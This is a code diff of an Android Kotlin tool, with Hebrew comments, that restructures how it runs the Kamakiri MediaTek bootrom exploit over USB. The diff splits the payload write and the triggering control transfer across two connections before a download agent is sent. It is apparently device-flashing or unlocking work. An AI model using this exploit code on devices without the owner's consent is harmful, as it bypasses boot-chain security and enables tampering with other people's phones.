@@ -10,7 +10,8 @@ import java.util.Locale
 
 object MtkBromConnection {
 
-    fun runKamakiriOnly(
+    // שלב 1: Kamakiri בלבד, סוגר את החיבור בסוף. לא שולח ctrl_transfer!
+    fun runKamakiriExploit(
         usbManager: UsbManager,
         device: UsbDevice,
         payloadBytes: ByteArray,
@@ -55,7 +56,7 @@ object MtkBromConnection {
             for (v in values) echo(ByteBuffer.allocate(4).putInt(v).array())
         }
 
-        onProgress("Starting Kamakiri exploit...")
+        onProgress("Starting Kamakiri exploit (no ctrl_transfer)...")
         val addr = 0x10007050
         val revdwordPayloadAddr = 0x000A1000
 
@@ -68,15 +69,14 @@ object MtkBromConnection {
         onProgress("Sending payload..."); usbwrite(payloadBytes)
         onProgress("read ack..."); usbread(2); usbread(2)
 
-        onProgress("Triggering ctrl_transfer...")
-        try { connection.controlTransfer(0xA1, 0, 0, 0x25, null, 0, 1000) } catch (e: Exception) {}
-
+        // סגירה מכוונת - לא שולחים ctrl_transfer כאן
         connection.close()
-        onProgress("Kamakiri done. Waiting for reconnection...")
+        onProgress("Payload sent. Connection closed. Waiting for BROM to reappear...")
         return "RECONNECT"
     }
 
-    fun sendDaOnReconnect(
+    // שלב 2: פותח חיבור חדש, שולח ctrl_transfer, ומיד DA
+    fun sendCtrlandDa(
         usbManager: UsbManager,
         device: UsbDevice,
         daBytes: ByteArray,
@@ -108,12 +108,21 @@ object MtkBromConnection {
             val buf = ByteArray(len); connection.bulkTransfer(epIn, buf, len, 2000); return buf
         }
 
+        // 1. ctrl_transfer על החיבור החדש (מפעיל את ה-Payload)
+        onProgress("Sending ctrl_transfer on fresh connection...")
+        try {
+            connection.controlTransfer(0xA1, 0, 0, 0x25, null, 0, 1000)
+        } catch (e: Exception) {
+            onProgress("ctrl_transfer error: ${e.message}")
+        }
+
+        // 2. מיד שולחים את ה-DA
+        onProgress("Sending $daName (${daBytes.size} bytes) immediately...")
+        
         val isBrom = device.productId == 0x0003 || device.productId == 0x0001
         val hsCmd = if (isBrom) 0xA0.toByte() else 0xA1.toByte()
-        onProgress("Trying $daName (${daBytes.size} bytes)... Handshake 0x${String.format(Locale.US, "%02X", hsCmd)}")
         usbwrite(byteArrayOf(hsCmd)); usbread(1)
 
-        onProgress("Sending 0xD7...")
         if (!usbwrite(byteArrayOf(0xD7.toByte()))) { connection.close(); return "FAIL:0xD7 write" }
         val ack1 = usbread(1)
         if (ack1.isEmpty() || ack1[0] != 0xD8.toByte()) {
